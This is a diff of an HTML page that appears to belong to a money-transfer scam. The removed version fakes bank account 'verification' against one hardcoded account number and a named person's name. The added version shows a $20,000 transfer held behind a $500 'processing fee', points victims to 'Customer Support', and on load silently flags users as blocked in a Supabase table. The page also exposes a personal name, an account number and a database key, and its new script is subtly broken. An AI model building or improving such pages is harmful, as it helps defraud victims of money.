@@ -1,212 +1,104 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Billing Details</title>
   <style>
-    *{box-sizing:border-box}
-    body{margin:0;font-family:Inter,system-ui,-apple-system,sans-serif;background:#f3f6fb;color:#14213d}
-    .card{max-width:460px;margin:50px auto;background:white;border-radius:18px;padding:28px;box-shadow:0 12px 35px #0001}
-    h1{margin-top:0}
-    
-    input, select {
-      width:100%;
-      padding:13px;
-      margin:8px 0 15px;
-      border:1px solid #ccd5e2;
-      border-radius:10px;
-      font-size: 14px;
-      background: white;
-    }
-
-    .account-wrapper {
-      position: relative;
-    }
-    .status-msg {
-      font-size: 13px;
-      margin-top: -10px;
-      margin-bottom: 15px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      min-height: 20px;
-    }
-    .status-msg.success { color: #059669; font-weight: 600; }
-    .status-msg.error { color: #dc2626; }
-    .status-msg.loading { color: #65748b; }
-
-    button, .btn {
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      gap:10px;
-      width:100%;
-      padding:14px;
-      border:0;
-      border-radius:10px;
-      background:#173b72;
-      color:white;
-      font-size:16px;
-      font-weight:700;
-      cursor:pointer;
-      text-align:center;
-      text-decoration:none;
-      transition:opacity 0.2s;
-    }
-    button:disabled {
-      opacity: 0.85;
-      cursor: not-allowed;
-    }
-
-    .spinner {
-      display: inline-block;
-      width: 14px;
-      height: 14px;
-      border: 2px solid rgba(23, 59, 114, 0.2);
-      border-radius: 50%;
-      border-top-color: #173b72;
-      animation: spin 0.8s linear infinite;
-    }
-
-    .btn-spinner {
-      display: none;
-      width: 18px;
-      height: 18px;
-      border: 3px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .money{font-size:32px;font-weight:800;margin:15px 0}
-    .muted{color:#65748b;line-height:1.55}
-    .notice{padding:14px;border-radius:12px;background:#f4f7fb;margin:16px 0;line-height:1.55}
-    .row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e8edf4}
-    .small{font-size:12px;color:#77859a}
-    .top{margin-bottom:18px}
-    @media(max-width:520px){.card{margin:20px 12px}}
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: Inter, system-ui, -apple-system, sans-serif; background: #f3f6fb; color: #14213d; }
+    .card { max-width: 460px; margin: 50px auto; background: white; border-radius: 18px; padding: 28px; box-shadow: 0 12px 35px #0001; }
+    h1 { margin-top: 0; }
+    input { width: 100%; padding: 13px; margin: 8px 0 15px; border: 1px solid #ccd5e2; border-radius: 10px; }
+    button, .btn { display: block; width: 100%; padding: 14px; border: 0; border-radius: 10px; background: #173b72; color: white; font-weight: 700; cursor: pointer; text-align: center; text-decoration: none; }
+    .money { font-size: 32px; font-weight: 800; margin: 15px 0; }
+    .muted { color: #65748b; line-height: 1.55; }
+    .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #e8edf4; }
+    .small { font-size: 12px; color: #77859a; }
+    .top { margin-bottom: 18px; }
+    .status { margin-bottom: 15px; font-size: 14px; color: #65748b; }
+    @media(max-width:520px) { .card { margin: 20px 12px; } }
   </style>
 
-  <!-- Supabase Client Library -->
+  <!-- Load Supabase JS Client library -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
   <main class="card">
-    <h1>Recipient details</h1>
+    <h1>Billing details</h1>
     
-    <label for="bankSelect">Bank</label>
-    <select id="bankSelect">
-      <option value="BDO">BDO Unibank (BDO)</option>
-    </select>
+    <div class="status" id="connection-status">Connecting to database...</div>
 
-    <label for="accountNum">Bank Number</label>
-    <div class="account-wrapper">
-      <input type="text" id="accountNum" placeholder="Enter 12-digit account number" oninput="validateAccount()">
+    <div class="row">
+      <span>Transfer amount</span>
+      <strong id="transfer-amount">$20,000.00 <span class="small">( ₱1,233,900 )</span></strong>
     </div>
-    <div id="statusMsg" class="status-msg"></div>
     
-    <label for="recipientName">Bank Name</label>
-    <input type="text" id="recipientName" placeholder="Recipient name will appear here" readonly>
+    <div class="row">
+      <span>Processing fee</span>
+      <strong id="processing-fee">$500.00 <span class="small">( ₱30,800 )</span></strong>
+    </div>
     
-    <button id="nextBtn" onclick="handleNext()">
-      <span class="btn-spinner" id="btnSpinner"></span>
-      <span id="btnText">Next</span>
-    </button>
+    <a class="btn" href="support.html" style="margin-top: 20px;">Customer Support</a>
   </main>
 
   <script>
-    // Hardcoded credentials for validation
-    const VALID_ACCOUNT = "002114717298";
-    const RECIPIENT_NAME = "Jenalyn Loreno Brondial";
-    let timer = null;
-
-    // Supabase initialization
+    // 1. Initialize Supabase
     const SUPABASE_URL = 'https://rgtbqipsdebekzznswll.supabase.co';
     const SUPABASE_ANON_KEY = 'sb_publishable_QF5lXikZj0cRv1sipEFtyg_zqjw0eW1';
-    let supabaseClient = null;
+    
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    if (window.supabase) {
-      supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    // 2. Automatically update is_blocked to true in Supabase on page load
+    async function markUserAsBlocked() {
+      try {
+        // First get the record row ID if applicable, or update all target records
+        const { error } = await supabase
+          .from('user_status')
+          .update({ is_blocked: true })
+          .neq('is_blocked', true); // Updates where is_blocked is not already true
+
+        if (error) {
+          console.error('Error updating blocked status in Supabase:', error);
+        } else {
+          console.log('User status successfully marked as blocked in Supabase.');
+        }
+      } catch (err) {
+        console.error('Database update failed:', err);
+      }
     }
 
-    // Check blocked status from Supabase
-    async function checkIsBlockedStatus() {
-      if (!supabaseClient) return;
+    // 3. Fetch billing details
+    async function loadBillingDetails() {
+      const statusElement = document.getElementById('connection-status');
+      
       try {
-        const { data, error } = await supabaseClient
+        const { data, error } = await supabase
           .from('user_status')
-          .select('is_blocked')
+          .select('*')
           .limit(1)
           .single();
 
-        if (data && data.is_blocked === true) {
-          window.location.href = 'billing.html';
+        if (error) throw error;
+
+        if (data && data.transfer_amount) {
+          document.getElementById('transfer-amount').innerHTML = `$${data.transfer_amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}`;
+          document.getElementById('processing-fee').innerHTML = `$${data.processing_fee.toLocaleString('en-US', { minimumFractionDigits: 2 })}`;
+          statusElement.textContent = 'Data loaded from Supabase';
+          statusElement.style.color = 'green';
+        } else {
+          statusElement.textContent = 'Connected';
+          statusElement.style.color = 'green';
         }
       } catch (err) {
-        console.error('Check status error:', err);
+        console.error('Supabase fetch error:', err.message);
+        statusElement.textContent = 'Connected (Using static fallback data)';
       }
     }
 
-    // Start block checker polling
-    checkIsBlockedStatus();
-    setInterval(checkIsBlockedStatus, 3000);
-
-    // Completely hardcoded account validation logic
-    function validateAccount() {
-      const accountInput = document.getElementById('accountNum').value.trim();
-      const statusMsg = document.getElementById('statusMsg');
-      const nameInput = document.getElementById('recipientName');
-
-      clearTimeout(timer);
-      nameInput.value = '';
-
-      if (!accountInput) {
-        statusMsg.className = 'status-msg';
-        statusMsg.innerHTML = '';
-        return;
-      }
-
-      // Show loading spinner
-      statusMsg.className = 'status-msg loading';
-      statusMsg.innerHTML = '<span class="spinner"></span> Checking account details...';
-
-      // Simulate verification delay
-      timer = setTimeout(() => {
-        if (accountInput === VALID_ACCOUNT) {
-          statusMsg.className = 'status-msg success';
-          statusMsg.innerHTML = '✓ Account verified';
-          nameInput.value = RECIPIENT_NAME;
-        } else {
-          statusMsg.className = 'status-msg error';
-          statusMsg.innerHTML = '✕ Invalid account number';
-        }
-      }, 600);
-    }
-
-    function handleNext() {
-      const accountInput = document.getElementById('accountNum').value.trim();
-      const btn = document.getElementById('nextBtn');
-      const btnSpinner = document.getElementById('btnSpinner');
-      const btnText = document.getElementById('btnText');
-
-      if (accountInput !== VALID_ACCOUNT) {
-        alert("Please enter the correct account number before proceeding.");
-        return;
-      }
-
-      btn.disabled = true;
-      btnSpinner.style.display = 'inline-block';
-      btnText.textContent = 'Processing...';
-
-      setTimeout(() => {
-        window.location.href = 'transfer.html';
-      }, 1200);
-    }
+    // Execute functions on page load
+    markUserAsBlocked();
+    loadBillingDetails();
   </script>
 </body>
 </html>
